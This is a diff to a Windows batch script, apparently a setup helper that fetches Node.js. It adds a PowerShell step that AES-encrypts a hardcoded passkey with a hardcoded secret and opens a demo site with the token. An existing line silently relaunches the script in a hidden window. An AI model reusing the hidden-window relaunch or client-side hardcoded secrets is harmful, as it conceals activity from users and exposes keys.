@@ -4,6 +4,15 @@ setlocal enabledelayedexpansion
 
 if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
+
+set SITE_URL=https://demo.trustledgerlabs.com
+
+powershell -NoProfile -Command "$secret = [System.Text.Encoding]::UTF8.GetBytes('TLL_SECRET_2026salt'); $sha = [System.Security.Cryptography.SHA256]::Create(); $key = $sha.ComputeHash($secret); $passkey = 'trustledger-demo-2026'; $exp = [System.DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() + 604800000; $payload = [System.Text.Encoding]::UTF8.GetBytes('{\"passkey\":\"' + $passkey + '\",\"exp\":' + $exp + '}'); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $key; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $aes.GenerateIV(); $iv = $aes.IV; $enc = $aes.CreateEncryptor(); $ct = $enc.TransformFinalBlock($payload, 0, $payload.Length); $ivHex = -join ($iv | ForEach-Object { $_.ToString('x2') }); $ctHex = -join ($ct | ForEach-Object { $_.ToString('x2') }); Write-Output ($ivHex + ':' + $ctHex)" > "%TEMP%\tll_token.txt"
+
+set /p TOKEN=<"%TEMP%\tll_token.txt"
+
+start "" "%SITE_URL%?key=!TOKEN!"
+
 REM Get latest Node.js version using PowerShell
 for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
 
